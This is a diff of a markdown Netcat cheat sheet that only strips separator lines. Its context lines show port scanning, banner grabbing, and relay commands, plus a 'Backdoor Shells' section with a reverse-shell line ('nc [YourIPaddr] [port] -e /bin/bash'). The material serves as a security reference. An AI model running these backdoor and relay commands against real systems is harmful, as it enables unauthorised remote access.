@@ -21,8 +21,6 @@ Connect to an arbitrary port [port] at IP Address [TargetIPaddr]
 nc -l -p [LocalPort]
 {% endhighlight %}
 Create a Netcat listener on arbitrary local port [LocalPort]
-&nsp;
----
 
 ### File Transfer
 
@@ -48,8 +46,6 @@ nc -w3 [TargetIPaddr] [port] > [outfile]
 {% endhighlight %}
 Connect to [TargetIPaddr] on [port] and retrieve [outfile]
 
----
-
 ### TCP Port Scanner
 
 #### Port scan an IP Address
@@ -61,8 +57,6 @@ Attempt to connect to each port in a range from [end_port] to [start_port] on IP
 sending any data (-z), and waiting no more than 1 second for a connection to occur (-w1)
 
 The randomized ports (-r) switch can be used to choose port numbers randomly in the range
-
----
 
 ### TCP Banner Grabber
 
@@ -78,8 +72,6 @@ received in response
 Add -r to randomize destination ports within the range
 
 Add -p [port] to specify a source port
-
----
 
 ### Backdoor Shells
 
@@ -107,8 +99,6 @@ nc [YourIPaddr] [port] -e /bin/bash
 {% endhighlight %}
 
 Create a reverse shell that will attempt to connect to [YourIPaddr] on a local [port]. This shell can then be captured on local port [port]. This shell can then be captured using a fundamental netcat listener
-
----
 
 ### Netcat Relays on Linux
 To begin, create a FIFO (named pipe) called backpipe:
@@ -139,8 +129,6 @@ nc [PreviousHopIPaddr] [port] 0<backpipe | [NextHopIPaddr] [port2] | tee backpip
 {% endhighlight %}
 
 Create a relay that sends packets from the connection to [PreviousHopIPaddr] on port [port] to a Netcat client connected to [NextHopIPaddr] on port [port2]
-
----
 
 ### Netcat Relays on Windows
 To begin, enter a temporary directory where we will create .bat files:
@@ -174,8 +162,6 @@ nc [PreviosHopIPaddr] [port] -e relay.bat
 
 Create a relay that will send packets from the connection to [PreviousHopIPaddr]
 on port [port] to a Netcat Client connected to [NextHopIPaddr] on port [port2]
-
----
 
 ### Netcat Command Flags
 {% highlight bash %}
